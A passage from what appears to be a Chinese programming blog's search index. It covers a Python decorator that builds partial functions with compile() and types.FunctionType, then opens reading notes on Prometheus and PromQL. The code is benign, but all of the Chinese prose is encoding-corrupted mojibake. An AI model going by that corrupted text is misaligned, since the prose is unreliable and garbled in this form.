ï¼Ÿæ²¡é—®é¢˜ï¼ç”¨å‡½æ•°ç±»å®šä¹‰ä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼Ÿä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ï¼ç‰›ï¼ˆå°±ï¼‰é€¼ï¼ˆæ˜¯ï¼‰äº†ï¼ˆæ…¢ï¼‰ã€‚compile å†…ç½®å‡½æ•°å¯ä»¥è®©æˆ‘ä»¬åŠ¨æ€åœ°é€šè¿‡å­—ç¬¦ä¸²æ¥ç¼–è¯‘ä»£ç ï¼Œæ¥ç”Ÿæˆä¸€ä¸ªä»£ç å¯¹è±¡ã€‚è¿™æ®µä»£ç å¯ä»¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¨‹åºï¼Œä¸€ä¸¤ä¸ªå®šä¹‰ï¼Œä¹Ÿå¯ä»¥æ˜¯å‡ ä¸ªè¡¨è¾¾å¼ã€‚è€Œé€šè¿‡ types.FunctionTypeï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä»£ç å¯¹è±¡ï¼Œå¹¶å‘å…¶ä¸­æ³¨å…¥ä¸€äº›ä¿¡æ¯ï¼ˆå¦‚ globalsï¼‰ï¼Œå³å¯ç”Ÿæˆä¸€ä¸ªå¯ç”¨çš„å‡½æ•°ã€‚123456789101112func_def = \"\"\"def f(a): return a + 1\"\"\"module_code = compile(func_def, '&lt;&gt;', 'exec')function_code = next(code for code in module_code.co_consts if isinstance(code, types.CodeType))# ä½¿ç”¨ exec æ¨¡å¼ç¼–è¯‘ä¸€æ®µä»£ç ï¼Œå¹¶ä»ä¸­è·å–å®šä¹‰å¥½çš„ code å¸¸é‡ï¼ˆä¹Ÿå°±æ˜¯ f å‡½æ•°çš„ä»£ç ï¼‰func = types.FunctionType(function_code, &#123;&#125;)# ç”Ÿæˆä¸€ä¸ªå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ `globals`. å› ä¸ºå‡½æ•°ä¸­ä¸ä¼šè°ƒç”¨åˆ°å…¨å±€å˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œä¼ é€’ç©ºå­—å…¸print(func, func(2))# &lt;function f at 0x00E78AE0&gt; 3æœ‰äº†è¿™ä¸ªï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»ä¸€æ®µå­—ç¬¦ä¸²ä¸­åŠ¨æ€ç”Ÿæˆä¸€ä¸ª Python å‡½æ•°äº†ã€‚12345678910111213141516171819202122def nb_partial(*partial_args): \"\"\" ç”Ÿæˆä¸€ä¸ªåå‡½æ•°ï¼Œä¸”æ–°å‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¸­ä¼šå»é™¤ \"\"\" def decorator(func): pre_arg_str = ', '.join(map(repr, partial_args)) code = func.__code__ args = code.co_varnames[:code.co_argcount] post_args = args[len(partial_args):] post_args_str = ', '.join(post_args) func_def = (f\"def wrapped(&#123;post_args_str&#125;):\\n\" f\" return func(&#123;pre_arg_str&#125;, &#123;post_args_str&#125;)\") module_code = compile(func_def, '&lt;&gt;', 'exec') function_code = next(code for code in module_code.co_consts if isinstance(code, types.CodeType)) wrapped = types.FunctionType(function_code, &#123;'func': func&#125;) # wrapped å‡½æ•°ä¸­å¼•ç”¨äº†ä¸€ä¸ªå¤–éƒ¨å˜é‡ï¼Œæ‰€ä»¥åœ¨å®šä¹‰å‡½æ•°æ—¶éœ€è¦æŠŠ func ä¼ è¿›å» return wraps(func)(wrapped) return decoratorè¿™é‡Œæœ‰ä¸€ä¸ªå°ç¼ºé™·æ²¡æœ‰è§£å†³æ‰ï¼šè¿™ä¸ªå‡½æ•°ä¸­çš„ func æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œè€Œä¸æ˜¯é—­åŒ…ä¸­çš„è‡ªç”±å˜é‡ã€‚è½¬å¿µä¸€æƒ³ï¼Œè£…é¥°å™¨ä¸­çš„åŸå§‹ func æœ¬èº«å°±ä¸æ˜¯è‡ªç”±å˜é‡å•Šâ€¦è„‘æ®‹äº† Orzï¼Œç»§ç»­ç»§ç»­ã€‚æ‰€ä»¥ï¼Œé€šè¿‡åŠ¨æ€å®šä¹‰å‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°è¿˜åŸå‚æ•°åˆ—è¡¨çš„çš„åå‡½æ•°åŠŸèƒ½ã€‚å¤§ä½“æ­¥éª¤å¦‚ä¸‹ï¼šæå–åŸå‡½æ•°å‚æ•°å¤„ç†æ–°å‡½æ•°å‚æ•°æ„é€ å‡½æ•°å®šä¹‰å­—ç¬¦ä¸²åŠ¨æ€å®šä¹‰æ–°å‡½æ•°å®Œæ•´å®ç°è§ä¸‹é¢ã€‚ 5. å†æ”¹è¿›ä¸€ä¸‹ï¼Ÿæˆ‘ä»¬çš„åŸå‡½æ•°ç›®å‰åªæ”¯æŒäº†æœ€ç®€å•çš„å‡½æ•°å£°æ˜æ–¹å¼ï¼Œè€Œæ— æ³•æ”¯æŒå…³é”®è¯å‚æ•°ï¼Œå‚æ•°é»˜è®¤å€¼ç­‰ã€‚ç»“åˆä¸Šé¢å†™çš„ FuncParserï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å¯¹åŠ¨æ€å‡½æ•°çš„å®šä¹‰åšè¿›ä¸€æ­¥æ”¹è¿›ã€‚å®Œæ•´å®ç°æœ‰ç‚¹é•¿ï¼Œè¿˜æ˜¯ä¸‹é¢è§ã€‚å½“ç„¶ï¼Œè¿™ä¸ªå®ç°è¿˜æœ‰ä¸€äº›å¯ä»¥æ”¹è¿›ä¹‹å¤„ï¼šåå‡½æ•°å®šä¹‰æ—¶å¯ä»¥æ”¯æŒå…³é”®å­—å‚æ•°ï¼Œè¿™éœ€è¦è¿›è¡Œæ›´å¤šçš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®šä¹‰æ—¶ä¼ è¿›å»çš„å…³é”®å­—å‚æ•°ï¼Œæœ‰å¯èƒ½åœ¨åŸå‡½æ•°ä¸­æ˜¯åºåˆ—å‚æ•°ï¼›æœ‰å¾ˆå¤šå¯¹è±¡å¹¶æ²¡æœ‰å¾ˆå¥½åœ°å®ç° __repr__ é­”æœ¯æ–¹æ³•ï¼Œå¯¼è‡´ repr(arg) åç”Ÿæˆçš„å­—ç¬¦ä¸²åœ¨å‡½æ•°å®šä¹‰ä¸­å¹¶ä¸èƒ½åšåˆ°å®Œæ•´è¿˜åŸã€‚æ‰€ä»¥æˆ‘ä»¬æœ€å¥½é€šè¿‡ globals å°†å®ƒç›´æ¥ä¼ è¿›æ–°çš„å‡½æ•°ä¸­ï¼Œè€Œä¸æ˜¯ä½¿ç”¨å­—ç¬¦ä¸²æ¥è¿›è¡Œå‚æ•°ä¼ é€’ã€‚çªç„¶çŠ¯æ‡’ï¼Œå°±ä¸å†åšè¿›ä¸€æ­¥çš„å®ç°äº†ã€‚ -2. ä»£ç æ±‡æ€» -2.1 è·å–å‡½æ•°å‚æ•°å£°æ˜çš„ FuncParser123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from collections import namedtupleFuncArgs = namedtuple('FuncArgs', ('args', 'defaults'))class FuncParser: @classmethod def parse_vars(cls, func): code = func.__code__ argc = code.co_argcount kwargc = code.co_kwonlyargcount varnames = code.co_varnames res = &#123; \"arg\": varnames[:argc], \"kwarg\": varnames[argc:argc + kwargc], \"*args\": None, \"**kwargs\": None &#125; flag = code.co_flags if flag &amp; 0x04: # Use *args res['*args'] = varnames[argc + kwargc] if flag &amp; 0x08: # Use **kwargs res['**kwargs'] = varnames[argc + kwargc + bool(flag &amp; 0x04)] # parse defaults defaults = func.__defaults__ or () defaults_map = dict(zip(reversed(res['arg']), reversed(defaults))) defaults_map.update(func.__kwdefaults__ or &#123;&#125;) return FuncArgs(res, defaults_map) @classmethod def build_param_str(cls, func_args): func_vars, defaults_map = func_args params = [] # arg for arg in func_vars['arg']: if arg in defaults_map: default_val = defaults_map[arg] params.append(f'&#123;arg&#125;=&#123;default_val&#125;') else: params.append(arg) # *args if func_vars['*args']: params.append(f\"*&#123;func_vars['*args']&#125;\") else: if func_vars['kwarg']: params.append('*') # kwarg for kwarg in func_vars['kwarg']: if kwarg in defaults_map: default_val = defaults_map[kwarg] params.append(f'&#123;kwarg&#125;=&#123;default_val&#125;') else: # ä¸€ç§å‡½æ•°å®šä¹‰ä¸ä¼šé‡åˆ°çš„æƒ…å†µï¼Œä½†åœ¨åé¢ä¼šç”¨åˆ°å®ƒ params.append(f'&#123;kwarg&#125;=&#123;kwarg&#125;') # **kwargs if func_vars['**kwargs']: params.append(f\"**&#123;func_vars['**kwargs']&#125;\") param = ', '.join(params) param_str = '(&#123;&#125;)'.format(param) return param_str @classmethod def analyse_func_param(cls, func): func_args = cls.parse_vars(func) name = func.__name__ return cls.build_param_str(func_args)def test_func(a, *args, b=1, **kwargs): passif __name__ == '__main__': import inspect import types funcs = [f for f in locals().values() if isinstance(f, types.FunctionType)] for f in funcs: fstr = FuncParser.analyse_func_param(f) assert fstr == str(inspect.signature(f)) # \"(a, *args, b=1, **kwargs)\" -2.2 â€œé«˜çº§â€åå‡½æ•°è£…é¥°å™¨çš„åˆæ­¥å®ç°123456789101112131415161718192021222324252627282930313233343536373839import typesfrom functools import wrapsfrom inspect import signaturedef nb_partial(*partial_args): \"\"\" ç”Ÿæˆä¸€ä¸ªåå‡½æ•°ï¼Œä¸”æ–°å‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¸­ä¼šå»é™¤ \"\"\" def decorator(func): pre_arg_str = ', '.join(map(repr, partial_args)) code = func.__code__ if len(partial_args) &gt; code.co_argcount: raise TypeError(\"Too many positional arguments\") args = code.co_varnames[:code.co_argcount] post_args = args[len(partial_args):] post_args_str = ', '.join(post_args) func_def = (f\"def wrapped(&#123;post_args_str&#125;):\\n\" f\" return func(&#123;pre_arg_str&#125;, &#123;post_args_str&#125;)\") module_code = compile(func_def, '&lt;&gt;', 'exec') function_code = next(code for code in module_code.co_consts if isinstance(code, types.CodeType)) wrapped = types.FunctionType(function_code, &#123;'func': func&#125;) return wraps(func)(wrapped) return decoratordef func(a, b, c): return sum([a, b, c])if __name__ == '__main__': print(func(1, 2, 3,), func, signature(func)) # 6 &lt;function func at 0x03B43B28&gt; (a, b, c) partial = nb_partial(3, 4)(func) # The decorator print(partial(5), partial, signature(partial, follow_wrapped=False)) # 12 &lt;function func at 0x03BC0DB0&gt; (c) -2.3 â€œé«˜çº§â€åå‡½æ•°è£…é¥°å™¨çš„è¿›é˜¶å®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import typesfrom functools import wrapsfrom inspect import signaturefrom funcparser import FuncParser, FuncArgs# ä¸Šé¢å†™å¥½çš„å‡½æ•°è§£æå™¨def nb_partial(*partial_args): \"\"\" ç”Ÿæˆä¸€ä¸ªåå‡½æ•°ï¼Œä¸”æ–°å‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¸­ä¼šå»é™¤ \"\"\" def decorator(func): code = func.__code__ if len(partial_args) &gt; code.co_argcount: raise TypeError(\"Too many positional arguments\") func_vars, defaults_map = FuncParser.parse_vars(func) # æ„å»ºå‡½æ•°å®šä¹‰ def_vars = func_vars.copy() def_vars[\"arg\"] = def_vars[\"arg\"][len(partial_args):] def_str = FuncParser.build_param_str(FuncArgs(def_vars, defaults_map)) # æ„é€ å‡½æ•°è°ƒç”¨ call_vars = func_vars.copy() call_vars[\"arg\"] = list(call_vars[\"arg\"]) call_vars[\"arg\"][:len(partial_args)] = list(map(repr, partial_args)) call_str = FuncParser.build_param_str(FuncArgs(call_vars, &#123;&#125;)) call_str = call_str.replace('*, ', '') func_def = (f\"def wrapped&#123;def_str&#125;:\\n\" f\" return func&#123;call_str&#125;\") module_code = compile(func_def, '&lt;&gt;', 'exec') function_code = next(code for code in module_code.co_consts if isinstance(code, types.CodeType)) # è®¾ç½®åºåˆ—å‚æ•°é»˜è®¤å€¼ argdefs = [] for arg in reversed(func_vars[\"arg\"]): if arg not in defaults_map: break argdefs.append(defaults_map[arg]) argdefs.reverse() wrapped = types.FunctionType(function_code, &#123;'func': func&#125;, argdefs=tuple(argdefs)) # è®¾ç½®å…³é”®å­—å‚æ•°é»˜è®¤å€¼ wrapped.__kwdefaults__ = func.__kwdefaults__ return wraps(func)(wrapped) return decoratordef func(a, b=2, c=3, *, d=5): print(locals()) return sum([a, b, c, d])if __name__ == '__main__': print(func(1, 2, 3, d=6), func, signature(func)) # locals: &#123;'a': 1, 'b': 2, 'c': 3, 'd': 6&#125; # 12 &lt;function func at 0x034B3AE0&gt; (a, b=2, c=3, *, d=5) # The decorator partial = nb_partial(3)(func) print(partial(6, d=7), partial, signature(partial, follow_wrapped=False)) # locals: &#123;'a': 3, 'b': 6, 'c': 3, 'd': 7&#125; # 19 &lt;function func at 0x00875390&gt; (b=2, c=3, *, d=5) -1. Reference &amp; å»¶ä¼¸é˜…è¯»Python è‡ªå®šä¹‰å‡½æ•°çš„ç‰¹æ®Šå±æ€§ï¼ˆæ”¶è—ä¸“ç”¨ï¼‰Python æ–‡æ¡£ï¼šData ModelPython åˆ›å»ºåŠ¨æ€å‡½æ•°","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"}]},{"title":"ã€ŠPrometheus Bookã€‹é˜…è¯»ç¬”è®°","slug":"prometheus-book-note","date":"2018-11-13T14:45:00.000Z","updated":"2019-02-21T11:32:38.048Z","comments":true,"path":"2018/11/prometheus-book-note/","link":"","permalink":"https://blog.stdioa.com/2018/11/prometheus-book-note/","excerpt":"çœ‹äº†ä¸€æœ¬åœ¨çº¿çš„å°ä¹¦ï¼Œå«ã€ŠPrometheus Bookã€‹ï¼Œåšäº†ä¸€ç‚¹æ‘˜æŠ„å’Œç¬”è®°ã€‚","text":"çœ‹äº†ä¸€æœ¬åœ¨çº¿çš„å°ä¹¦ï¼Œå«ã€ŠPrometheus Bookã€‹ï¼Œåšäº†ä¸€ç‚¹æ‘˜æŠ„å’Œç¬”è®°ã€‚ ç¬¬ 1 ç« ï¼šå¤©é™å¥‡å…µç¬¬ä¸€ç« å¯¹ Prometheus çš„æ¶æ„å’Œç”¨æ³•åšäº†ç®€å•çš„ä»‹ç»ã€‚ åŸºæœ¬ä»‹ç»é€šè¿‡å»ºç«‹å®Œå–„çš„ç›‘æ§ä½“ç³»ï¼Œæˆ‘ä»¬å¯ä»¥è¾¾åˆ°ä»¥ä¸‹ç›®çš„ï¼šé•¿æœŸè¶‹åŠ¿åˆ†æã€å¯¹ç…§åˆ†æã€å‘Šè­¦ã€æ•…éšœåˆ†æä¸å®šä½ã€æ•°æ®å¯è§†åŒ–ã€‚Prometheusæ˜¯ä¸€ä¸ªå¼€æºçš„å®Œæ•´ç›‘æ§è§£å†³æ–¹æ¡ˆï¼Œå…¶å¯¹ä¼ ç»Ÿç›‘æ§ç³»ç»Ÿçš„æµ‹è¯•å’Œå‘Šè­¦æ¨¡å‹è¿›è¡Œäº†å½»åº•çš„é¢ è¦†ï¼Œå½¢æˆäº†åŸºäºä¸­å¤®åŒ–çš„è§„åˆ™è®¡ç®—ã€ç»Ÿä¸€åˆ†æå’Œå‘Šè­¦çš„æ–°æ¨¡å‹ã€‚ä¸ªäººç†è§£ï¼Œè¿™é‡Œçš„ä¸­å¤®åŒ–ä¸»è¦æ˜¯æŒ‡æ•°æ®å­˜å‚¨ä¸­å¤®åŒ–ï¼šå„ä¸ªæ•°æ®æºå°†æŒ‡æ ‡æš´éœ²å‡ºæ¥ï¼Œç”± Prometheus æœåŠ¡å™¨é‡‡é›†åç»Ÿä¸€å­˜å‚¨ã€ç»Ÿä¸€åˆ†æï¼Œæ–¹ä¾¿èšåˆæŸ¥è¯¢ã€‚Prometheus çš„åŸºæœ¬ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼šå…¶ä¸­ Prometheus Server æ˜¯æ•´ä¸ªç»„ä»¶ä¸­çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œè´Ÿè´£å®ç°å¯¹ç›‘æ§æ•°æ®çš„è·å–ã€å­˜å‚¨åŠæŸ¥è¯¢ï¼›PushGateway ç”¨äºåœ¨æŸäº›ç¯å¢ƒä¸­è¢«åŠ¨æ”¶é›†ç”¨æˆ·æŒ‡æ ‡ï¼Œå¹¶æä¾›ç»™ Serverï¼›åœ¨ Server ä¸­å®šä¹‰çš„æŠ¥è­¦è§„åˆ™å¦‚æœè¢«è§¦å‘ï¼Œåˆ™ AlertManager ä¼šè´Ÿè´£è¯¥æŠ¥è­¦çš„åç»­å¤„ç†æµç¨‹ï¼ˆå¦‚é€šçŸ¥ç”¨æˆ·ï¼‰ã€‚Prometheus Server é€šè¿‡ä¸¤ç§æ–¹å¼æ¥è·å–æ•°æ®ï¼šé€šè¿‡ HTTP API ç›´æ¥è®¿é—®å®ä¾‹ä»¥è·å–æ•°æ®å½“ Prometheus Server æ— æ³•ç›´æ¥è®¿é—®åˆ°å®ä¾‹æ—¶ï¼Œå®ä¾‹å¯ä»¥ä¸»åŠ¨æ¨é€æ•°æ®åˆ° PushGatewayï¼ŒServer è®¿é—® PushGateway æ¥è·å–æ•°æ®ã€‚Prometheus çš„åŸºæœ¬æ•°æ®æ¨¡å‹ï¼šä¸€ä¸ªæŒ‡æ ‡ï¼Œç”±å®ƒçš„åå­—å’Œå€¼ç»„æˆã€‚æŒ‡æ ‡çš„åå­—ç”±æŒ‡æ ‡åç§°ä»¥åŠå¤šå¯¹æè¿°æ ·æœ¬ç‰¹å¾çš„ KV æ ‡ç­¾æ„æˆï¼›è€ŒæŒ‡æ ‡çš„å€¼æ˜¯ä¸€ä¸ªåºåˆ—ï¼Œè®°å½•äº†æ¯ä¸ªæ—¶é—´ç‚¹çš„æŒ‡æ ‡å€¼ã€‚Prometheus å°†è¿™ä¸ªåŸºæœ¬æŒ‡æ ‡è¿›è¡Œäº†ç»„åˆå’Œæ‹“å±•ï¼Œæ„æˆäº†å››ç§æŒ‡æ ‡æ•°æ®ç»“æ„ï¼šCounterã€Gaugeã€Summary å’Œ Histogramï¼Œä½¿ç”¨è€…å¯ä»¥ä½¿ç”¨è¿™å››ç§æ•°æ®ç»“æ„æ¥å®ç°å¤šæ ·åŒ–çš„æŒ‡æ ‡å®šä¹‰å’Œåˆ†ææ¨¡å¼ã€‚ å®‰è£…è¿è¡ŒPrometheus é‡‡ç”¨ Golang ç¼–è¯‘ï¼Œä¸å­˜åœ¨ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œå¯ä»¥ç›´æ¥è¿è¡Œï¼›æˆ–è€… Prometheus å®˜æ–¹ä¹Ÿæä¾›äº† Docker é•œåƒã€‚å®˜æ–¹æä¾›äº† node_exporter ç”¨äºé‡‡é›†ä¸»æœºçš„è¿è¡ŒæŒ‡æ ‡ã€‚è¿è¡Œåï¼Œå¯ä»¥é€šè¿‡é…ç½® prometheus.yml çš„ scrape_configs æ¥æ·»åŠ ä»»åŠ¡ï¼š1234567scrape_configs: - job_name: 'prometheus' static_configs: - targets: ['localhost:9090'] - job_name: 'node' static_configs: - targets: ['localhost:9100']é‡å¯åï¼ŒæŸ¥è¯¢ up æŒ‡æ ‡ï¼Œå¯ä»¥çœ‹åˆ° up{job=&quot;node&quot;} çš„å€¼ä¸º 1ï¼Œè¯´æ˜æ¥è‡ªæ”¹ç«¯ç‚¹çš„æŒ‡æ ‡å¯ä»¥æ­£å¸¸è·å–ã€‚ æ‚é¡¹Prometheus è‡ªå¸¦çš„ UI ç•Œé¢åŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ­¤æ—¶å¯ä»¥è€ƒè™‘ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„å¯è§†åŒ–çš„å·¥å…·å¦‚ Grafana.åœ¨ Prometheus ä¸­ï¼Œæ¯ä¸ªæš´éœ²ç›‘æ§æ ·æœ¬æ•°æ®çš„ HTTP æœåŠ¡ç§°ä¸ºä¸€ä¸ªå®ä¾‹ï¼Œä¸€ç»„å‡ºäºç›¸åŒé‡‡é›†ç›®çš„çš„å®ä¾‹ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªä»»åŠ¡ï¼ˆJobï¼‰è¿›è¡Œåˆ†ç»„ç®¡ç†ã€‚ ç¬¬ 2 ç« ï¼šæ¢ç´¢ PromQLç¬¬äºŒç« ä¸»è¦è®²è§£äº†æŸ¥è¯¢ä¸­æ‰€ç”¨åˆ°çš„æ•°æ®ç±»å‹ï¼›ç›‘æ§æŒ‡æ ‡ç±»å‹ï¼›ä»¥åŠåŸºæœ¬çš„ PromQL ä½¿ç”¨ã€‚ åŸºæœ¬æ¦‚å¿µæ—¶é—´åºåˆ—ï¼šä¸€ä¸ªåºåˆ—ï¼Œå…¶ä¸­çš„æ¯ä¸ªå€¼ç”±ä¸€ä¸ªæ—¶é—´æˆ³å’Œä¸€ä¸ªæµ®ç‚¹æ•°æ„æˆï¼Œè¡¨ç¤ºæŸä¸€æ—¶åˆ»ç›‘æ§æ ·æœ¬çš„å…·ä½“å€¼æ ·æœ¬ï¼šæ—¶é—´åºåˆ—çš„ä¸€ä¸ªç‚¹ï¼Œç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šæŒ‡æ ‡ï¼ˆmetricï¼‰ï¼šæŒ‡æ ‡åï¼Œæ ‡ç­¾ç»„ï¼›æ—¶é—´æˆ³ï¼ˆtimestampï¼‰æ ·æœ¬å€¼ï¼ˆvalueï¼‰æŒ‡æ ‡ååæ˜ äº†ç›‘æ§æ ·æœ¬çš„å«ä¹‰ï¼›æ ‡ç­¾ç»„åæ˜ äº†æ ·æœ¬çš„ç‰¹å¾ç»´åº¦ï¼Œå¯ç”¨äºè¿‡æ»¤æˆ–èšåˆã€‚æŒ‡æ ‡åå…¶å®ä¹Ÿæ˜¯æ ‡ç­¾ï¼Œkey ä¸º __name__ æŒ‡æ ‡ç±»å‹Prometheus ä¸ºå®ä¾‹åº”ç”¨å®šä¹‰äº†å››ç§ä¸åŒçš„æŒ‡æ ‡ç±»å‹ï¼šCounterã€Gaugeã€Summary å’Œ Histogram.Counter åªå¢ä¸å‡ï¼ŒGauge å¯åŠ å¯å‡ï¼›Summary å’Œ Histogram æ˜¯ç»„åˆæŒ‡æ ‡ï¼Œç”¨äºç»Ÿè®¡å’Œåˆ†ææ ·æœ¬çš„åˆ†å¸ƒæƒ…å†µã€‚ä¸Summaryç±»å‹çš„æŒ‡æ ‡ç›¸ä¼¼ä¹‹å¤„åœ¨äºHistogramç±»å‹çš„æ ·æœ¬åŒæ ·ä¼šååº”å½“å‰æŒ‡æ ‡çš„è®°å½•çš„æ€»æ•°ï¼ˆä»¥_countä½œä¸ºåç¼€ï¼‰ä»¥åŠå…¶å€¼çš„æ€»é‡ï¼ˆä»¥_sumä½œä¸ºåç¼€ï¼‰ã€‚ä¸åŒåœ¨äºHistogramæŒ‡æ ‡ç›´æ¥ååº”äº†åœ¨ä¸åŒåŒºé—´å†…æ ·æœ¬çš„ä¸ªæ•°ï¼ŒåŒºé—´é€šè¿‡æ ‡ç­¾lenè¿›è¡Œå®šä¹‰ã€‚åŒæ—¶å¯¹äºHistogramçš„æŒ‡æ ‡ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡histogram_quantile()å‡½æ•°è®¡ç®—å‡ºå…¶å€¼çš„åˆ†ä½æ•°ã€‚ä¸åŒåœ¨äºHistogramé€šè¿‡histogram_quantileå‡½æ•°æ˜¯åœ¨æœåŠ¡å™¨ç«¯è®¡ç®—çš„åˆ†ä½æ•°ã€‚ è€ŒSumamryçš„åˆ†ä½æ•°åˆ™æ˜¯ç›´æ¥åœ¨å®¢æˆ·ç«¯è®¡ç®—å®Œæˆã€‚å› æ­¤å¯¹äºåˆ†ä½æ•°çš„è®¡ç®—è€Œè¨€ï¼ŒSummaryåœ¨é€šè¿‡PromQLè¿›è¡ŒæŸ¥è¯¢æ—¶æœ‰æ›´å¥½çš„æ€§èƒ½è¡¨ç°ï¼Œè€ŒHistogramåˆ™ä¼šæ¶ˆè€—æ›´å¤šçš„èµ„æºã€‚åä¹‹å¯¹äºå®¢æˆ·ç«¯è€Œè¨€Histogramæ¶ˆè€—çš„èµ„æºæ›´å°‘ã€‚åœ¨é€‰æ‹©è¿™ä¸¤ç§æ–¹å¼æ—¶ç”¨æˆ·åº”è¯¥æŒ‰ç…§è‡ªå·±çš„å®é™…åœºæ™¯è¿›è¡Œé€‰æ‹©ã€‚ æŸ¥è¯¢ æŸ¥è¯¢æ–¹æ³•æŸ¥è¯¢æ—¶ï¼Œé¦–å…ˆè¦æä¾›æŒ‡æ ‡åï¼Œç„¶åæ ¹æ® label æ¥ç­›é€‰æŒ‡æ ‡ã€‚PromQL æä¾›å››ç§ label ç­›é€‰çš„æ–¹å¼ï¼šk=v, k!=v, k=~regex, k!~regexæŸ¥è¯¢æ—¶é—´èŒƒå›´ï¼šä½¿ç”¨æ–¹æ‹¬å·å°†æ—¶é—´æ®µæ‹¬ä½ï¼Œå¯ä»¥æŸ¥è¯¢æœ€è¿‘ä¸€æ®µæ—¶é—´å†…çš„æ•°æ®ï¼Œå¦‚ http_requrest_total{}[5m]æ—¶é—´åç§»ï¼šä½¿ç”¨ offset å°†æŸ¥è¯¢æ—¶é—´æ®µå‘å‰æ¨ç§»å¦‚ http_requrest_total{}[5m] offset 1hèšåˆç­›é€‰æ“ä½œï¼šç”¨ by å¯ä»¥å¯¹æŸäº›æ ‡ç­¾è¿›è¡Œèšåˆï¼Œç”¨ without å¯ä»¥å°†æŸäº›æ ‡ç­¾æ’é™¤ï¼Œå¯¹å‰©ä¸‹çš„æ ‡ç­¾è¿›è¡Œèšåˆã€‚å¦‚ sum(up) by (instance) æ•°æ®ç»“æ„è¡¨ç¤ºæ¯ä¸ªå®ä¾‹çš„ metrics API äº§å‡ºçš„æ•°æ®ç»“æ„åªæœ‰ä¸€ä¸ªç”±å¤šä¸ªæ•°æ®æŒ‡æ ‡æ„æˆçš„ç¬æ—¶å‘é‡ï¼›è¿™é‡Œçš„æ•°æ®ç»“æ„ä¸ºè¾“å‡ºæ•°æ®ç»“æ„ï¼Œç”¨äºæŸ¥è¯¢æ—¶è¿›è¡Œè¿ç®—åŠè¾“å‡ºã€‚æ ‡é‡ï¼ˆScalarï¼‰ï¼šä¸€ä¸ªæµ®ç‚¹å‹æ•°æ®å€¼å­—ç¬¦ä¸²ï¼ˆStringï¼‰æ—¶é—´åºåˆ—ï¼ˆTime Seriesï¼‰ï¼šä¸€ä¸ªåºåˆ—ï¼Œå…¶ä¸­çš„æ¯ä¸ªç‚¹éƒ½ç”±ä¸€ä¸ªæ—¶é—´æˆ³å’Œä¸€ä¸ªæ•°æ®å€¼æ„æˆå‘é‡ï¼šç”±å¤šä¸ªæŒ‡æ ‡å’Œå…¶å¯¹åº”çš„æ—¶é—´åºåˆ—æ„æˆç¬æ—¶å‘é‡ï¼ˆInstant Vectorï¼‰ï¼šä¸€ä¸ªå‘é‡ï¼Œå…¶ä¸­æ¯ä¸ªæŒ‡æ ‡åªåŒ…å«ä¸€ä¸ªç‚¹åŒºé—´å‘é‡ï¼šä½¿ç”¨åŒºé—´å‘é‡è¡¨è¾¾å¼ [5m] å¾—åˆ°çš„ç»“æœï¼Œæ¯ä¸ªæŒ‡æ ‡åŒ…å«å¤šä¸ªç‚¹ï¼›ç”¨äºè¡¨ç¤ºä¸€æ®µæ—¶é—´å†…çš„å˜åŒ–å€¼æ —å­ï¼š12345678910111213# ç¬æ—¶å‘é‡Query: checkin_rpc_request_time_countcheckin_rpc_request_time_count&#123;endpoint=&quot;CreateFCL&quot;&#125; 1checkin_rpc_request_time_count&#123;endpoint=&quot;CreateUCL&quot;&#125; 3# åŒºé—´å‘é‡Query: checkin_rpc_request_time_count[2m]checkin_rpc_request_time_count&#123;endpoint=&quot;CreateFCL&quot;&#125; 1 @1541421409.712 1 @1541421469.712checkin_rpc_request_time_count&#123;endpoint=&quot;CreateUCL&quot;&#125; 3 @1541421437.904 3 @1541421497.904 è¿ç®— æ•°å­¦è¿ç®—PromQL æ”¯æŒçš„æ•°å­¦è¿ç®—ç¬¦æœ‰ +, -, *, /, %, ^ï¼ˆå¹‚è¿ç®—ï¼‰å½“ä¸¤ä¸ªå‘é‡ç›¸åŠ æ—¶ï¼Œå¯¹åº”æ—¶é—´ç‚¹çš„å€¼å°†ä¼šç›¸åŠ å¹¶è¿”å›ï¼›è‹¥æŸç‚¹åœ¨å¦ä¸€å‘é‡ä¸­ä¸å­˜åœ¨ï¼Œåˆ™è¯¥ç‚¹ä¼šè¢«ä¸¢å¼ƒï¼›å½“ä¸€ä¸ªå‘é‡åŠ ä¸€ä¸ªæ ‡é‡æ—¶ï¼Œä¼šå°†å‘é‡ä¸­æ¯ä¸ªç‚¹çš„å€¼åŠ ä¸Šè¿™ä¸ªæ ‡é‡å¹¶è¿”å›ã€‚ æ¡ä»¶è¿ç®—PromQL æ”¯æŒçš„æ¡ä»¶è¿ç®—ç¬¦æœ‰ ==, !=, &gt;, &lt;, &gt;=, &lt;=a &gt; 2ï¼Œä¼šç­›é€‰å‡ºæ‰€æœ‰å€¼å¤§äº 2 çš„ç‚¹ï¼Œä¸æ»¡è¶³æ¡ä»¶çš„ç‚¹å°†ä¼šè¢«ä¸¢å¼ƒï¼›a &gt; bool 2ï¼Œä¼šå¯¹æ‰€æœ‰ç‚¹è¿›è¡Œé€»è¾‘è¿ç®—ï¼Œå¾—å‡ºç»“æœ 0 æˆ– 1 